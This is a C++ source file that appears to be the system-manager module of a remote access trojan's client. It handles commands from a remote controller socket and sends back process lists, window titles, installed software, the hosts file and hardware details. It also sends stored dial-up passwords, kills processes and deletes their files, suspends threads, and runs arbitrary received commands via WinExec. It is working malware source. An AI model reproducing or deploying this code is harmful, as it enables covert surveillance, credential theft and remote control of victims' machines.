// SystemManager.cpp: implementation of the CSystemManager class.
//
//////////////////////////////////////////////////////////////////////
#include "StdAfx.h"
#include "SystemManager.h"
#include <stdlib.h>
#include <tlhelp32.h>

#include <psapi.h>
#pragma comment(lib,"Psapi.lib")

#include "Dialupass.h"



////////硬件信息用到的头和库
#include <setupapi.h>
#include <devguid.h>
#include <regstr.h>
#pragma comment(lib,"Setupapi.lib")

CSystemManager::CSystemManager(CClientSocket *pClient) : CManager(pClient)
{

	SendProcessList();

}

CSystemManager::~CSystemManager()
{

}

bool SwitchInputDesktop()
{
	
	BOOL	bRet = false;
	DWORD	dwLengthNeeded;
	
	HDESK	hOldDesktop, hNewDesktop;
	char	strCurrentDesktop[256], strInputDesktop[256];
	hOldDesktop = GetThreadDesktop(GetCurrentThreadId());
	memset(strCurrentDesktop, 0, sizeof(strCurrentDesktop));
	GetUserObjectInformation(hOldDesktop, UOI_NAME, &strCurrentDesktop, sizeof(strCurrentDesktop), &dwLengthNeeded);
	
	
	hNewDesktop = OpenInputDesktop(0, FALSE, MAXIMUM_ALLOWED);
	memset(strInputDesktop, 0, sizeof(strInputDesktop));
	GetUserObjectInformation(hNewDesktop, UOI_NAME, &strInputDesktop, sizeof(strInputDesktop), &dwLengthNeeded);
	
	if (lstrcmpi(strInputDesktop, strCurrentDesktop) != 0)
	{
		SetThreadDesktop(hNewDesktop);
		bRet = true;
	}
	CloseDesktop(hOldDesktop);
	
	CloseDesktop(hNewDesktop);
	
	
	return bRet;
}

void CSystemManager::OnReceive(LPBYTE lpBuffer, UINT nSize)
{
	SwitchInputDesktop();

	switch (lpBuffer[0])
	{
	case COMMAND_PSLIST:
		SendProcessList();
		break;
	case COMMAND_WSLIST:
		SendWindowsList();
		break;
	case COMMAND_KILLPROCESS:
		KillProcess((LPBYTE)lpBuffer + 1, nSize - 1);
		SendProcessList();
		break;
	case COMMAND_FREEZING:  
		Freezing((LPBYTE)lpBuffer + 1, nSize - 1);
		break;
	case COMMAND_THAW:  
		Thaw((LPBYTE)lpBuffer + 1, nSize - 1);
		break;
	case COMMAND_KILLPROCESS_WINDOW:
		KillProcess((LPBYTE)lpBuffer + 1, nSize - 1);
		SendWindowsList();	
		break;
	case COMMAND_FILEATTR:
		SendFileAttr((LPCSTR)lpBuffer + 1); //文件属性
		break;
	case COMMAND_WINDOW_TEST:
		TestWindow(lpBuffer+1);   
		break;
	case COMMAND_WINDOW_CLOSE:  //向窗口发送关闭消息
		CloseWindow(lpBuffer+1);  
		break;
	case COMMAND_DSLIST:   //获取拨号密码
		SendDialupassList();
		break;
	case COMMAND_SOFTWARELIST:
		SendSoftWareList();
		break;
	case COMMAND_APPUNINSTALL:
		WinExec((LPCSTR)lpBuffer + 1,SW_SHOW);
		break;
	case COMMAND_HOSTS:
		SendHostsList();
		break;
	case COMMAND_HARDWARE:				// 硬件信息
		SendHardwareList();
		break;
	default:
		break;
	}
}

void CSystemManager::SendProcessList()
{
	UINT	nRet = -1;
	LPBYTE	lpBuffer = getProcessList();
	if (lpBuffer == NULL)
		return;
	
	Send((LPBYTE)lpBuffer, LocalSize(lpBuffer));
	LocalFree(lpBuffer);
}

BOOL DosPathToNtPath(LPTSTR pszDosPath, LPTSTR pszNtPath)
{
	TCHAR			szDriveStr[500];
	TCHAR			szDrive[3];
	TCHAR			szDevName[100];
	INT				cchDevName;
	INT				i;
	
	//检查参数
	if(!pszDosPath || !pszNtPath )
		return FALSE;
	
	//获取本地磁盘字符串
	if(GetLogicalDriveStrings(sizeof(szDriveStr), szDriveStr))
	{
		for(i = 0; szDriveStr[i]; i += 4)
		{
			if(!lstrcmpi(&(szDriveStr[i]), "A:\\") || !lstrcmpi(&(szDriveStr[i]), "B:\\"))
				continue;
			
			szDrive[0] = szDriveStr[i];
			szDrive[1] = szDriveStr[i + 1];
			szDrive[2] = '\0';
			if(!QueryDosDevice(szDrive, szDevName, 100))//查询 Dos 设备名
				return FALSE;
			
			cchDevName = lstrlen(szDevName);
			if(strncmp(pszDosPath, szDevName, cchDevName) == 0)//命中
			{
				lstrcpy(pszNtPath, szDrive);//复制驱动器
				lstrcat(pszNtPath, pszDosPath + cchDevName);//复制路径
				return TRUE;
			}			
		}
	}
	
	lstrcpy(pszNtPath, pszDosPath);
	
	return FALSE;
}

BOOL GetProcessUserName(HANDLE hProcess, TCHAR * strProcessUser)
{
	HANDLE hToken = NULL;
	BOOL bFuncReturn = FALSE;
	PTOKEN_USER pToken_User = NULL;
	DWORD dwTokenUser = 0;
	TCHAR szAccName[MAX_PATH] = {0};
	TCHAR szDomainName[MAX_PATH] = {0};
	HANDLE hProcessToken = NULL;
	if(hProcess != NULL)
	{
		// 提升本进程的权限
		bFuncReturn = ::OpenProcessToken(hProcess,TOKEN_QUERY,&hToken);
		if( bFuncReturn == 0) // 失败
			return FALSE;
		
		if(hToken != NULL)
		{
			::GetTokenInformation(hToken, TokenUser, NULL,0L, &dwTokenUser);
			if(dwTokenUser>0)
			{
				pToken_User = (PTOKEN_USER)::GlobalAlloc( GPTR, dwTokenUser );
			}
			
			if(pToken_User != NULL)
			{
				bFuncReturn = ::GetTokenInformation(hToken, TokenUser, pToken_User, dwTokenUser, &dwTokenUser);
			}
			
			if(bFuncReturn != FALSE && pToken_User != NULL)
			{
				SID_NAME_USE eUse  = SidTypeUnknown;
				DWORD dwAccName    = 0L; 
				DWORD dwDomainName = 0L;
				PSID  pSid = pToken_User->User.Sid;
				bFuncReturn = ::LookupAccountSid(NULL, pSid, NULL, &dwAccName,
					NULL,&dwDomainName,&eUse );
				
				if(dwAccName>0 && dwAccName < MAX_PATH && dwDomainName>0 && dwDomainName <= MAX_PATH)
				{
					bFuncReturn = ::LookupAccountSid(NULL,pSid,szAccName,&dwAccName,
						szDomainName,&dwDomainName,&eUse );
				}
				
				if( bFuncReturn != 0)
					lstrcpy(strProcessUser,szAccName);

			}
		}
	}
	
	if (pToken_User != NULL)
		::GlobalFree( pToken_User );
	
	if(hToken != NULL)
		::CloseHandle(hToken);
	
	return TRUE;
}
  
LPBYTE CSystemManager::getProcessList()
{
	HANDLE			hSnapshot = NULL;
	HANDLE			hProcess = NULL;
	HMODULE			hModules = NULL;
	PROCESSENTRY32	pe32 = {0};
	DWORD			cbNeeded;
	char			strProcessName[MAX_PATH] = {0};
	char            strProcessUser[MAX_PATH] = {0};
	TCHAR           szImagePath[MAX_PATH] ={0};
	LPBYTE			lpBuffer = NULL;
	DWORD			dwOffset = 0;
	DWORD			dwLength = 0;
	DWORD           dwWorkingSetSize = 0;
	DWORD           dwFileSize = 0;
	PROCESS_MEMORY_COUNTERS pmc;
	DebugPrivilege(SE_DEBUG_NAME, TRUE);
	
	hSnapshot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
	
	if(hSnapshot == INVALID_HANDLE_VALUE)
		return NULL;
	
	pe32.dwSize = sizeof(PROCESSENTRY32);
	
	lpBuffer = (LPBYTE)LocalAlloc(LPTR, 1024);
	
	lpBuffer[0] = TOKEN_PSLIST;
	dwOffset = 1;
	
	if(Process32First(hSnapshot, &pe32))
	{	  
		do
		{      
			hProcess = OpenProcess(PROCESS_QUERY_INFORMATION | PROCESS_VM_READ, FALSE, pe32.th32ProcessID);
			if ((pe32.th32ProcessID !=0 ) && (pe32.th32ProcessID != 4) && (pe32.th32ProcessID != 8))
			{
				EnumProcessModules(hProcess, &hModules, sizeof(hModules), &cbNeeded);
				
				if(0 == GetProcessImageFileName(hProcess, szImagePath, MAX_PATH))
				{
					lstrcpy(strProcessName, "unknown erro");
					
				}
				else if(!DosPathToNtPath( szImagePath,strProcessName))
				{
					
				}

				memset(strProcessUser,0,sizeof(strProcessUser));
				if (GetProcessUserName(hProcess,strProcessUser))
				{
					if (lstrlen(strProcessUser) == 0)
					{
						lstrcpy(strProcessUser,"ERROR 2");
					}
				}
				else
				{
					lstrcpy(strProcessUser,"ERROR 1");
				}
				
				// 此进程占用数据大小
				dwLength = sizeof(DWORD)*5 + lstrlen(pe32.szExeFile) + lstrlen(strProcessName) + lstrlen(strProcessUser) + 3;
				// 缓冲区太小，再重新分配下
				if (LocalSize(lpBuffer) < (dwOffset + dwLength))
					lpBuffer = (LPBYTE)LocalReAlloc(lpBuffer, (dwOffset + dwLength), LMEM_ZEROINIT|LMEM_MOVEABLE);
				
				memcpy(lpBuffer + dwOffset, &(pe32.th32ProcessID), sizeof(DWORD));
				dwOffset += sizeof(DWORD);	
				
				memcpy(lpBuffer + dwOffset, pe32.szExeFile, lstrlen(pe32.szExeFile) + 1);
				dwOffset += lstrlen(pe32.szExeFile) + 1;
				
				memcpy(lpBuffer + dwOffset, strProcessName, lstrlen(strProcessName) + 1);
				dwOffset += lstrlen(strProcessName) + 1;


				DWORD dwPriClass = GetPriorityClass(hProcess);
 				memcpy(lpBuffer + dwOffset, &dwPriClass, sizeof(DWORD) );
				dwOffset += sizeof(DWORD);

				dwPriClass = pe32.cntThreads;
				memcpy(lpBuffer + dwOffset, &dwPriClass, sizeof(DWORD) );
				dwOffset += sizeof(DWORD);

				memcpy(lpBuffer + dwOffset, strProcessUser, lstrlen(strProcessUser) + 1);
				dwOffset += lstrlen(strProcessUser) + 1;

				ZeroMemory(&pmc,sizeof(pmc));
				pmc.cb = sizeof(PROCESS_MEMORY_COUNTERS);
				if (GetProcessMemoryInfo( hProcess, &pmc, sizeof(pmc)) )
				{
					dwWorkingSetSize = (DWORD)(pmc.WorkingSetSize/1024);		//单位为k
				}
				else
					dwWorkingSetSize = 0;

				memcpy(lpBuffer + dwOffset, &dwWorkingSetSize, sizeof(DWORD));
				dwOffset += sizeof(DWORD);


				HANDLE handle = CreateFile(strProcessName, GENERIC_READ, FILE_SHARE_READ, 0, OPEN_EXISTING, 0, 0);
				if (handle != INVALID_HANDLE_VALUE)
				{
					dwFileSize = GetFileSize(handle, NULL)  / 1024;
					CloseHandle(handle);
				}
				else
					dwFileSize = 0;

				memcpy(lpBuffer + dwOffset, &dwFileSize, sizeof(DWORD));
				dwOffset += sizeof(DWORD);

			}

			CloseHandle(hProcess);//新修改
		}
		while(Process32Next(hSnapshot, &pe32));
	}
	
	lpBuffer = (LPBYTE)LocalReAlloc(lpBuffer, dwOffset, LMEM_ZEROINIT|LMEM_MOVEABLE);
	
	DebugPrivilege(SE_DEBUG_NAME, FALSE); 
	CloseHandle(hSnapshot);
	return lpBuffer;	
}

void CSystemManager::SendWindowsList()
{
	LPBYTE	lpBuffer = getWindowsList();
	if (lpBuffer == NULL)
		return;
	
	Send((LPBYTE)lpBuffer, LocalSize(lpBuffer));
	
	LocalFree(lpBuffer);	
}

LPBYTE CSystemManager::getWindowsList()
{
	LPBYTE	lpBuffer = NULL;
	EnumWindows((WNDENUMPROC)EnumWindowsProc, (LPARAM)&lpBuffer);
	lpBuffer[0] = TOKEN_WSLIST;
	return lpBuffer;	
}

bool CALLBACK CSystemManager::EnumWindowsProc(HWND hwnd, LPARAM lParam)
{
	if(!IsWindowVisible(hwnd))
		return true;
	
	DWORD dwLength = 0;
	DWORD dwOffset = 0;
	
	LPBYTE lpBuffer = *(LPBYTE *)lParam;
	
	char strTitle[1024]={0};
	try
	{
		if (!SendMessage(hwnd,WM_GETTEXT,sizeof(strTitle)-1,(LPARAM)strTitle))
			return true;
		
		strTitle[sizeof(strTitle)-1]=0;
		
		if (lstrlen(strTitle) == 0)
			return true;
		
		if (lpBuffer == NULL)
		{
			lpBuffer = (LPBYTE)LocalAlloc(LPTR, 1);
			dwOffset=1;
		}else
		{
			dwOffset = LocalSize(lpBuffer);
			while(*(lpBuffer + dwOffset - 2)==0) dwOffset--;			
		}
		
		dwLength = sizeof(DWORD) + sizeof(DWORD) + lstrlen(strTitle) + 1;
		lpBuffer = (LPBYTE)LocalReAlloc(lpBuffer, dwOffset + dwLength, LMEM_ZEROINIT|LMEM_MOVEABLE);
	}catch (...)
	{
		return true;
	}
	
	GetWindowThreadProcessId(hwnd, (LPDWORD)(lpBuffer + dwOffset));
	memcpy(lpBuffer + dwOffset + sizeof(DWORD) ,&hwnd,sizeof(DWORD));
	
	memcpy(lpBuffer + dwOffset + sizeof(DWORD)*2, strTitle, lstrlen(strTitle) + 1);
	
	*(LPBYTE *)lParam = lpBuffer;
	return true;
}

void CSystemManager::KillProcess(LPBYTE lpBuffer, UINT nSize)
{
	HANDLE hProcess = NULL;
	DebugPrivilege(SE_DEBUG_NAME, TRUE);
	nSize -=1;
	char    strProcessName[MAX_PATH] = {0};
	
	for (UINT i = 0; i < nSize; i += 4)
	{
		hProcess = OpenProcess(PROCESS_ALL_ACCESS, FALSE, *(LPDWORD)(lpBuffer + 1 + i));
		GetModuleFileNameEx(hProcess,NULL,strProcessName, sizeof(strProcessName));
		BOOL bProcess = TerminateProcess(hProcess, 0);
		
		if (lpBuffer[0] && bProcess)
		{			
			int n = 0;
			while(1)
			{
				DeleteFile(strProcessName);
				Sleep(200);
				if(GetFileAttributes(strProcessName) == -1)  //检查文件不存在  退出
					break;
				n ++ ;
				if(n >= 10)  //无法删除 一段时间后退出
					break;
			}
		}
		CloseHandle(hProcess);
	}
	DebugPrivilege(SE_DEBUG_NAME, FALSE);
	// 稍稍Sleep下，防止出错
	Sleep(100);
}


void CSystemManager::Freezing(LPBYTE lpBuffer, UINT nSize)  
{	
	HANDLE hProcess = NULL;
	DebugPrivilege(SE_DEBUG_NAME, TRUE);
	DWORD Pid = *(LPDWORD)(lpBuffer);
	THREADENTRY32 th32;
	th32.dwSize=sizeof(th32);
	
	HANDLE hThreadSnap=::CreateToolhelp32Snapshot(TH32CS_SNAPTHREAD,0);
	if(hThreadSnap==INVALID_HANDLE_VALUE)
	{
		//		return -1;
	}
	BOOL b=::Thread32First(hThreadSnap,&th32);
	while(b)
	{
		if(th32.th32OwnerProcessID==Pid)
		{	
			HANDLE oth=OpenThread(THREAD_ALL_ACCESS,FALSE,th32.th32ThreadID);
			if(!(::SuspendThread(oth)))
			{
				//	printf("Onlock ExeFileName %s\n",pe32.szExeFile);
			}
			CloseHandle(oth);
			//	break;  //对于线程不能break了,注意哦~
		}
		b=::Thread32Next(hThreadSnap,&th32);
	}
	::CloseHandle(hThreadSnap);
}

void CSystemManager::Thaw(LPBYTE lpBuffer, UINT nSize)  
{
	HANDLE hProcess = NULL;
	DebugPrivilege(SE_DEBUG_NAME, TRUE);
	DWORD Pid = *(LPDWORD)(lpBuffer);
	THREADENTRY32 th32;
	th32.dwSize=sizeof(th32);
	
	HANDLE hThreadSnap=::CreateToolhelp32Snapshot(TH32CS_SNAPTHREAD,0);
	if(hThreadSnap==INVALID_HANDLE_VALUE)
	{
		//		return -1;
	}
	BOOL b=::Thread32First(hThreadSnap,&th32);
	while(b)
	{
		if(th32.th32OwnerProcessID==Pid)
		{	
			HANDLE oth=OpenThread(THREAD_ALL_ACCESS,FALSE,th32.th32ThreadID);
			CloseHandle(oth);
			break;
		}
		::Thread32Next(hThreadSnap,&th32);
	}
	::CloseHandle(hThreadSnap);
}

//获取文件属性
LPBYTE CSystemManager::GetFileAttr(BYTE szByte , LPCSTR FilePath)
{
	LPBYTE	lpBuffer = (LPBYTE)LocalAlloc(LPTR, sizeof(CFileStatus) + 1);
	
	lpBuffer[0] = szByte;
	CFileStatus rStatus;//结构体
	CFile::GetStatus(FilePath,rStatus); //获取文件属性
	
	memcpy(lpBuffer + 1, &rStatus, sizeof(CFileStatus)); //组合文件属性
	
	return lpBuffer;
}

//文件属性
void CSystemManager::SendFileAttr(LPCSTR FilePath)
{
	
	UINT	nRet = -1;
	LPBYTE	lpBuffer = GetFileAttr(TOKEN_FILEATTR,FilePath);
	if (lpBuffer == NULL)
		return;
	Send((LPBYTE)lpBuffer, LocalSize(lpBuffer)); 
	
	LocalFree(lpBuffer);
}

void CSystemManager::TestWindow(LPBYTE lpBuffer)
{
   	DWORD hwnd;
	DWORD dHow;
	memcpy((void*)&hwnd,lpBuffer,sizeof(DWORD));      //得到窗口句柄
	memcpy(&dHow,lpBuffer+sizeof(DWORD),sizeof(DWORD));     //得到窗口处理参数
	ShowWindow((HWND__ *)hwnd,dHow);
}

void CSystemManager::CloseWindow(LPBYTE lpBuffer)
{

	DWORD hwnd;
	memcpy(&hwnd,lpBuffer,sizeof(DWORD));      //得到窗口句柄 
	::PostMessage((HWND__ *)hwnd,WM_CLOSE,0,0); //向窗口发送关闭消息
	
	Sleep(200);
	SendWindowsList();  //窗口显示刷新
}

void CSystemManager::SendDialupassList()
{
	CDialupass	pass;
	
	int	nPacketLen = 0;
	int i;
	for (i = 0; i < pass.GetMax(); i++)
	{
		COneInfo	*pOneInfo = pass.GetOneInfo(i);
		for (int j = 0; j < STR_MAX; j++)
			nPacketLen += lstrlen(pOneInfo->Get(j)) + 1;
	}
	
	nPacketLen += 1;
	LPBYTE lpBuffer = (LPBYTE)LocalAlloc(LPTR, nPacketLen);
	
	DWORD	dwOffset = 1;
	for (i = 0; i < pass.GetMax(); i++)
	{
		COneInfo	*pOneInfo = pass.GetOneInfo(i);
		for (int j = 0; j < STR_MAX; j++)
		{
			int	nFieldLength = lstrlen(pOneInfo->Get(j)) + 1;
			memcpy(lpBuffer + dwOffset, pOneInfo->Get(j), nFieldLength);
			dwOffset += nFieldLength;
		}
	}
	
	lpBuffer[0] = TOKEN_DIALUPASS;
	Send((LPBYTE)lpBuffer, LocalSize(lpBuffer));
	LocalFree(lpBuffer);
}

void CSystemManager::SendSoftWareList()
{
	LPBYTE	lpBuffer = getSoftWareList();
	if (lpBuffer == NULL)
		return;
	
	Send((LPBYTE)lpBuffer, LocalSize(lpBuffer));
	LocalFree(lpBuffer);
}

LPBYTE CSystemManager::getSoftWareList()
{
	const int  MAX_LEG = 256 * sizeof(TCHAR);

	LPBYTE 	lpBuffer = NULL;
	DWORD	dwOffset = 1;
	DWORD   dwLength = 0;
	TCHAR regBufferValue[MAX_LEG] = {0};
	TCHAR regDisplayName[MAX_LEG] = {0};
	TCHAR regPublisher[MAX_LEG] = {0};
	TCHAR regDisplayVersion[MAX_LEG] = {0};
	TCHAR regInstallDate[MAX_LEG] = {0};
	TCHAR regUninstallString[MAX_LEG] = {0};

	lpBuffer = (LPBYTE)LocalAlloc(LPTR, 1024);
	if(lpBuffer == NULL)
		return NULL;

	lpBuffer[0] = TOKEN_SOFTWARE;

	int n  = 0;
	HKEY hKey;
	DWORD dwRegNum = MAX_LEG;
	TCHAR regBufferName[MAX_LEG] = {0};
	if( RegOpenKeyEx(HKEY_LOCAL_MACHINE, "SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Uninstall",
		NULL, KEY_READ, &hKey) == ERROR_SUCCESS    ) 
	{
		if( RegQueryInfoKey(hKey, NULL, NULL, NULL, &dwRegNum, NULL, NULL, NULL, NULL, NULL, NULL, NULL)    ==    ERROR_SUCCESS )
		{

			for( int i = 0; i < (int)dwRegNum; i++ ) 
			{    
				DWORD dwRegSize = MAX_LEG;
				RegEnumKeyEx(hKey, i, regBufferName, &dwRegSize, NULL, NULL, NULL, NULL);
				DWORD dwType; 
				HKEY hSubKey;
				if(  RegOpenKeyEx(hKey, regBufferName, NULL, KEY_READ, &hSubKey) == ERROR_SUCCESS)
				{
					
					dwRegSize = MAX_LEG;
					memset(regDisplayName,0,MAX_LEG);
					RegQueryValueEx(hSubKey, "DisplayName", 0, &dwType, (LPBYTE)regDisplayName, &dwRegSize);


					dwRegSize = MAX_LEG;
					memset(regBufferValue,0,MAX_LEG);
					// 取ParentKeyName键值,判断是否是补丁信息, 是补丁信息键值为"OperatingSystem"
					RegQueryValueEx(hSubKey, "ParentKeyName", 0, &dwType, (LPBYTE)regBufferValue, &dwRegSize);
					if( lstrlen(regDisplayName) == 0 || lstrcmp( regBufferValue,"OperatingSystem") == 0 ) //判断是否是补丁信息 
					{
						continue;
					}

					
					dwRegSize = MAX_LEG;
					memset(regPublisher,0,MAX_LEG);
					RegQueryValueEx(hSubKey, "Publisher", 0, &dwType,(LPBYTE)regPublisher, &dwRegSize);

					
					dwRegSize = MAX_LEG;
					memset(regDisplayVersion,0,MAX_LEG);
					RegQueryValueEx(hSubKey, "DisplayVersion", 0, &dwType, (LPBYTE)regDisplayVersion, &dwRegSize);

					
					dwRegSize = MAX_LEG;
					memset(regInstallDate,0,MAX_LEG);
					// 判断是否能在注册表中获取到安装时间, 否取子项创建时间
					if(RegQueryValueEx(hSubKey, "InstallDate", 0, &dwType, (LPBYTE)regInstallDate, &dwRegSize) == ERROR_SUCCESS )
					{
					}
					else
					{
						FILETIME fileLastTime;
						RegQueryInfoKey(hSubKey, NULL, NULL, NULL, NULL, NULL, NULL, NULL, 
							NULL, NULL, NULL, &fileLastTime);
						SYSTEMTIME sTime, stLocal ;
						FileTimeToSystemTime(&fileLastTime,&sTime);
						SystemTimeToTzSpecificLocalTime(NULL, &sTime, &stLocal);
						TCHAR tchTime[MAX_LEG] = {0};
						wsprintf(tchTime,"%d%02d%02d",stLocal.wYear,stLocal.wMonth,stLocal.wDay);
						lstrcpy(regInstallDate,tchTime);
					}

					dwRegSize = MAX_LEG;
					memset(regUninstallString,0,MAX_LEG);
					RegQueryValueEx(hSubKey, "UninstallString", 0, &dwType, (LPBYTE)regUninstallString, &dwRegSize);
	

					// 缓冲区太小，再重新分配下
					dwLength = lstrlen(regDisplayName) + lstrlen(regPublisher) + lstrlen(regDisplayVersion) + lstrlen(regInstallDate) + lstrlen(regUninstallString) + 6;
					if (LocalSize(lpBuffer) < (dwOffset + dwLength))
						lpBuffer = (LPBYTE)LocalReAlloc(lpBuffer, (dwOffset + dwLength), LMEM_ZEROINIT|LMEM_MOVEABLE);


					memcpy(lpBuffer + dwOffset, regDisplayName, lstrlen(regDisplayName) + 1);
			    	dwOffset += lstrlen(regDisplayName) + 1;

					memcpy(lpBuffer + dwOffset, regPublisher, lstrlen(regPublisher) + 1);
			    	dwOffset += lstrlen(regPublisher) + 1;

					memcpy(lpBuffer + dwOffset, regDisplayVersion, lstrlen(regDisplayVersion) + 1);
			    	dwOffset += lstrlen(regDisplayVersion) + 1;

					memcpy(lpBuffer + dwOffset, regInstallDate, lstrlen(regInstallDate) + 1);
			    	dwOffset += lstrlen(regInstallDate) + 1;

					memcpy(lpBuffer + dwOffset, regUninstallString, lstrlen(regUninstallString) + 1);
			    	dwOffset += lstrlen(regUninstallString) + 1;										
				}             
			}
		}
	}
	else 
	{
		return FALSE; //打开键失败
	}

	RegCloseKey(hKey);

	lpBuffer = (LPBYTE)LocalReAlloc(lpBuffer, dwOffset, LMEM_ZEROINIT|LMEM_MOVEABLE);

	return lpBuffer;
}

void CSystemManager::SendHostsList()
{
	UINT	nRet = -1;
	LPBYTE	lpBuffer = getHostsList();
	if (lpBuffer == NULL)
		return;
	
	Send((LPBYTE)lpBuffer, LocalSize(lpBuffer));
	LocalFree(lpBuffer);
}


LPBYTE CSystemManager::getHostsList()
{
	LPBYTE 	lpBuffer = NULL;
	DWORD	dwOffset = 1;
	DWORD   dwLength = 0;
	lpBuffer = (LPBYTE)LocalAlloc(LPTR, 1024);
	lpBuffer[0] = TOKEN_HOSTS;
	CString strPath;  
    CString strSystem, strWindows;  
    ::GetSystemDirectory(strSystem.GetBuffer(MAX_PATH), MAX_PATH);  
    ::GetWindowsDirectory(strWindows.GetBuffer(32), 32);  
    TCHAR szDriver[5] = {0};  
    RtlCopyMemory(szDriver, strWindows.GetBuffer(1), 3*sizeof(TCHAR));  
    szDriver[3] = 0;  
    strPath.Format("%s\\drivers\\etc\\hosts", strSystem);     
	
    CStdioFile sf;     
    CFileException e;   
    CString strSign, strTemp, strFile;  
    bool bOpen = sf.Open(strPath, CFile::typeText|CFile::modeRead, &e);  
    if(bOpen)    
    {         
        int cnt = 0;  
        while(sf.ReadString(strSign) != NULL)  
        {  
            cnt++;
            strFile += strSign;  
            strFile += "\r\n";         
            strTemp.Format("%d", cnt);  
			
        }  
        sf.Close();  
    }  
	// 缓冲区太小，再重新分配下
	dwLength = lstrlen(strFile) + 6;
	if (LocalSize(lpBuffer) < (dwOffset + dwLength))
		lpBuffer = (LPBYTE)LocalReAlloc(lpBuffer, (dwOffset + dwLength), LMEM_ZEROINIT|LMEM_MOVEABLE);
	memcpy(lpBuffer + dwOffset, strFile, lstrlen(strFile) + 1);
	dwOffset += lstrlen(strFile) + 1;			
	return lpBuffer;	
}

void CSystemManager::SendHardwareList()
{
	UINT	nRet = -1;
	LPBYTE	lpBuffer = getHardwareList();
	if (lpBuffer == NULL)
		return;
	
	Send((LPBYTE)lpBuffer, LocalSize(lpBuffer));
	LocalFree(lpBuffer);
}



LPBYTE CSystemManager::getHardwareList()
{
	LPBYTE 	lpBuffer = NULL;
	DWORD	dwOffset = 1;
	DWORD   dwLength = 0;
	lpBuffer = (LPBYTE)LocalAlloc(LPTR, 1024);
	lpBuffer[0] = TOKEN_HARDWARE;
	
	
	HDEVINFO hDevInfo;
    SP_DEVINFO_DATA DeviceInfoData;
    DWORD i;
	
    // Create a HDEVINFO with all present devices.
    hDevInfo = SetupDiGetClassDevs(	NULL,  
		0, // Enumerator
		0,
		DIGCF_PRESENT | DIGCF_ALLCLASSES );
    
    if (hDevInfo == INVALID_HANDLE_VALUE)
    {
        // Insert error handling here.
        return 0;
    }
    
    // Enumerate through all devices in Set.
    
    DeviceInfoData.cbSize = sizeof(SP_DEVINFO_DATA);
    for (i=0;SetupDiEnumDeviceInfo(hDevInfo,i,  &DeviceInfoData);i++)
    {
        DWORD DataT;
        LPTSTR buffer = NULL;
        DWORD buffersize = 0;
        
        
        // Call function with null to begin with, 
        // then use the returned buffer size 
        // to Alloc the buffer. Keep calling until
        // success or an unknown failure.
        
        while (!SetupDiGetDeviceRegistryProperty(   hDevInfo,
			&DeviceInfoData,
			SPDRP_DEVICEDESC,
			&DataT,
			(PBYTE)buffer,
			buffersize,
			&buffersize))
        {
            if (GetLastError() ==  ERROR_INSUFFICIENT_BUFFER)
            {
                //改变缓冲区大小
                if (buffer) 
					LocalFree(buffer);
                buffer = (char*)LocalAlloc(LPTR,buffersize);
            }
            else
            {
                //在这里放错误处理代码
                break;
            }
        }
		
		// 缓冲区太小，再重新分配下
		dwLength = lstrlen(buffer) + 1;
		if (LocalSize(lpBuffer) < (dwOffset + dwLength))
			lpBuffer = (LPBYTE)LocalReAlloc(lpBuffer, (dwOffset + dwLength), LMEM_ZEROINIT|LMEM_MOVEABLE);
		memcpy(lpBuffer + dwOffset, buffer, lstrlen(buffer) + 1);
		dwOffset += lstrlen(buffer) + 1;	
		
        if (buffer) 
			LocalFree(buffer);
    }
    
    
    if ( GetLastError()!=NO_ERROR &&  GetLastError()!=ERROR_NO_MORE_ITEMS )
    {
		//在这里放错误处理代码
        return 0;
    }
    
    // 清理
    SetupDiDestroyDeviceInfoList(hDevInfo); 
	lpBuffer = (LPBYTE)LocalReAlloc(lpBuffer, dwOffset, LMEM_ZEROINIT|LMEM_MOVEABLE);		
	return lpBuffer;	
}